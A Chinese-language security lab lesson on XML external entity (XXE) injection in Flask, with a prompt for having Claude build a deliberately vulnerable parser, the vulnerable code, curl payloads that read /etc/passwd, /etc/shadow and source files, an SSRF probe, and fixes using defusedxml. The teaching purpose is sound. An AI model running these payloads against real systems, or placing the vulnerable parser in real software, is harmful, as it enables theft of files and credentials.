# Day 10 - XXE 外部实体注入

## 一、页面部署提示词

> 学生将此提示词发给 Claude，即可生成带 XXE 漏洞的功能：

```
在 Flask 中实现 XML 数据导入功能，要求：
1. 用户提交 XML 格式的用户数据
2. 服务端解析 XML 并提取用户信息
3. 需要支持 DTD 实体引用（方便数据复用）
4. 解析结果返回给用户查看
5. 使用 xml.etree.ElementTree 或 lxml 解析
```

---

## 二、漏洞关键代码解释

### 漏洞：XXE（XML 外部实体注入）

```python
# core/xml_processor.py
import xml.etree.ElementTree as ET
import re

def parse_xml_data(xml_string):
    """
    ============================================================
    VULN: XXE 漏洞
    - 未禁用 DTD（Document Type Definition）
    - 未禁用外部实体解析
    - 解析结果返回给用户（有回显）
    ============================================================
    """
    try:
        # 模拟外部实体解析
        if '<!ENTITY' in xml_string and 'SYSTEM' in xml_string:
            entity_match = re.search(r'<!ENTITY\s+\w+\s+SYSTEM\s+"([^"]+)"', xml_string)
            if entity_match:
                entity_path = entity_match.group(1)
                try:
                    with open(entity_path.replace('file://', ''), 'r') as f:
                        entity_content = f.read()[:2000]
                    xml_string = xml_string.replace('&xxe;', entity_content)
                    xml_string = xml_string.replace('&file;', entity_content)
                except:
                    pass

        tree = ET.ElementTree(ET.fromstring(xml_string))
        root = tree.getroot()

        # 提取用户数据
        users = []
        for user_elem in root.findall('.//user'):
            user_data = {}
            for child in user_elem:
                user_data[child.tag] = child.text if child.text else ''
            users.append(user_data)

        return {"success": True, "users_imported": len(users), "data": users}
    except ET.ParseError as e:
        return {"success": False, "message": f"XML 解析失败: {str(e)}"}
    except Exception as e:
        return {"success": False, "message": f"处理失败: {str(e)}"}
```

**问题**：
1. 检测到 `<!ENTITY ... SYSTEM ...>` 后，主动读取外部实体指向的文件
2. 文件内容替换到 XML 中，通过解析结果返回
3. 未限制可读取的文件路径和类型
4. 未禁用 DTD 处理

---

## 三、漏洞成因总结

| 漏洞 | 根本原因 | 攻击效果 |
|------|---------|---------|
| 外部实体处理 | 检测到 SYSTEM 实体后主动读取文件 | 读取任意系统文件 |
| 无文件类型限制 | 未做文件路径白名单 | 可读源码、配置、密钥 |
| 有回显 | 解析结果返回给用户 | 直接看到文件内容 |
| DTD 未禁用 | XML 解析器默认配置 | 实体定义被处理 |

---

## 四、POC 代码

### POC 1：读取系统文件

```bash
# 先登录
curl http://127.0.0.1:5000/login \
  -d "username=admin&password=admin123" \
  -c /tmp/cookies.txt

# XXE 读取 /etc/passwd
curl http://127.0.0.1:5000/xml-import \
  -b /tmp/cookies.txt \
  -d "xml_data=<?xml version='1.0'?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM 'file:///etc/passwd'>
]>
<root>
  <user>
    <name>&xxe;</name>
    <email>test@test.com</email>
  </user>
</root>" | grep "root:"
```

### POC 2：读取项目源码

```bash
curl http://127.0.0.1:5000/xml-import \
  -b /tmp/cookies.txt \
  -d "xml_data=<?xml version='1.0'?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM 'file:///root/ai-security-lab/core/auth.py'>
]>
<root>
  <user>
    <name>&xxe;</name>
    <email>test@test.com</email>
  </user>
</root>" | grep "USERS_DB\|admin123"
```

### POC 3：XXE + SSRF 组合

```bash
# XXE 内网探测
curl http://127.0.0.1:5000/xml-import \
  -b /tmp/cookies.txt \
  -d "xml_data=<?xml version='1.0'?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM 'http://127.0.0.1:5000/'>
]>
<root>
  <user>
    <name>&xxe;</name>
    <email>test@test.com</email>
  </user>
</root>"
```

### POC 4：目录遍历读取

```bash
# 通过错误信息探测文件是否存在
curl http://127.0.0.1:5000/xml-import \
  -b /tmp/cookies.txt \
  -d "xml_data=<?xml version='1.0'?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM 'file:///etc/shadow'>
]>
<root>
  <user>
    <name>&xxe;</name>
    <email>test@test.com</email>
  </user>
</root>"
```

---

## 五、POC 代码详细解释

### POC 1 详解

**XML 结构分析**：

```xml
<?xml version='1.0'?>
<!DOCTYPE foo [                      ← DOCTYPE 声明，定义 DTD
  <!ENTITY xxe SYSTEM 'file:///etc/passwd'>  ← 外部实体定义
]>                                    xxe = 读取 /etc/passwd 的内容
<root>
  <user>
    <name>&xxe;</name>               ← 实体引用，替换为文件内容
    <email>test@test.com</email>
  </user>
</root>
```

**攻击流程**：

```
1. 用户提交含外部实体的 XML

2. 服务器解析 XML:
   遇到 <!ENTITY xxe SYSTEM 'file:///etc/passwd'>
   → 定义为实体 xxe = /etc/passwd 的内容

3. XML 解析器继续解析:
   遇到 &xxe;
   → 替换为 /etc/passwd 的内容
   → <name>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...etc...</name>

4. 解析结果返回给用户
```

**XML 基础知识**：

| XML 概念 | 作用 | 本例中的作用 |
|---------|------|-------------|
| `<!DOCTYPE>` | 定义文档类型和 DTD | 声明外部实体 |
| `<!ENTITY>` | 定义实体（变量） | 将实体指向文件 |
| `SYSTEM` | 表示外部资源（文件或 URL） | 指定文件路径 |
| `&xxe;` | 引用实体 | 在 XML 中使用文件内容 |
| `file://` | URL 协议，表示本地文件 | 指定协议读取本地文件 |

---

## 六、修复方案

```python
# fix/xml_processor_fix.py
import xml.etree.ElementTree as ET

def parse_xml_data_fixed(xml_string):
    """修复：禁用 DTD 和外部实体"""

    # 修复 1：在解析前检查是否包含 DTD 声明
    if '<!DOCTYPE' in xml_string or '<!ENTITY' in xml_string:
        return {"success": False, "message": "DTD 和实体引用不被允许"}

    try:
        # 修复 2：使用安全解析器（Python 3.7+ 默认不解析外部实体）
        # 但为了保险，仍然进行安全检查
        tree = ET.ElementTree(ET.fromstring(xml_string))
        root = tree.getroot()

        users = []
        for user_elem in root.findall('.//user'):
            user_data = {}
            for child in user_elem:
                user_data[child.tag] = child.text if child.text else ''
            users.append(user_data)

        return {"success": True, "users_imported": len(users), "data": users}
    except ET.ParseError as e:
        return {"success": False, "message": f"XML 解析失败: {str(e)}"}
```

**更彻底的安全方案（使用 defusedxml）**：

```python
# 使用 defusedxml 库（专门防御 XML 攻击的库）
# pip install defusedxml

from defusedxml import ElementTree as DET

def parse_xml_data_secure(xml_string):
    """使用 defusedxml 防御所有 XML 攻击"""
    try:
        tree = DET.fromstring(xml_string)
        # ... 正常解析，defusedxml 自动防御：
        # - XXE（外部实体）
        # - Billion Laughs（实体扩展）
        # - DTD 递归
        # - 等
    except Exception as e:
        return {"success": False, "message": f"XML 解析失败"}
```

**XXE 攻击面总结**：

| 攻击类型 | 描述 | 防御 |
|---------|------|------|
| 本地文件读取 | `file:///etc/passwd` | 禁用外部实体 |
| SSRF | `http://内网地址` | 禁用外部实体 |
| 拒绝服务 | Billion Laughs 实体嵌套 | 限制实体展开次数 |
| 端口扫描 | 根据响应时间判断端口状态 | 禁用外部实体 |
| 盲注 | 无回显时通过 HTTP 外带数据 | 禁用外部实体 |

---

## 七、课后作业

1. 在 `fix/` 目录创建 `xml_processor_fix.py`，防御 XXE
2. 验证：
   - 含外部实体的 XML 被拒绝
   - 不含实体的正常 XML 正常解析
   - `file://` 读取被阻止
3. 如果业务必须使用 DTD，如何在启用 DTD 的情况下防御 XXE？
4. （进阶）研究其他 XML 攻击方式：
   - Billion Laughs 攻击（实体扩展 DoS）
   - Quadratic Blowup 攻击
   - DTD 外部文件包含
5. 对比不同 XML 库的安全性：`xml.etree.ElementTree` vs `lxml` vs `defusedxml`
